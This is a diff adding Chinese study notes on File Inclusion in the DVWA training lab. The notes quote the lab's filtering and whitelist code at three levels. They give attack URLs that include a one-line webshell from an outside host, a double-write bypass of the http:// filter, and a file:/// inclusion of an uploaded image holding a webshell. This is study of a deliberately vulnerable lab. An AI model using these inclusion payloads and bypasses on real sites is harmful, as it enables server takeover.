@@ -23,3 +23,26 @@ checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php'
 根据过滤的字符中发现的没有过滤完全的字符编写注入字符串能成功注入
 3.针对每个点进行拆分分成四段再组合起来，难以入侵
 三.文件包含（File Inclusion）
+文件包含防御方法（根据DVWA的文件包含测试网站总结出的防御方法）
+先包含一个不存在的文件http://127.0.0.1/vulnerabilities/fi/?page=haha.php服务器发生报错
+在云端搭了一个一句话木马，然后包含该文件看看：
+http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.10.139/xie.php
+能通过中国菜刀进行渗透
+1.使用 str_replace函数 对http:// 和 https://进行了过滤，
+防止了远程包含漏洞的产生，也过滤了 ../ 和 ..\ 防止了进行目录切换的包含。
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\"" ), "", $file );
+对于这种防御措施可以使用双写绕过：hthttp://tp://xx->http://xx  会过滤掉http://
+2.对包含的文件名进行了限制，必须为 file* 或者 include.php ，否则会提示Error：File not  found。
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+需要配合文件上传漏洞，先把一句话木马上传到服务器端，然后再文件包含
+http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/PhpStudy/PHPTutorial/WWW/DVWA/hackable/uploads/1.jpg
+这样服务器会把jpg文件当成php执行
+3.使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生
+if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
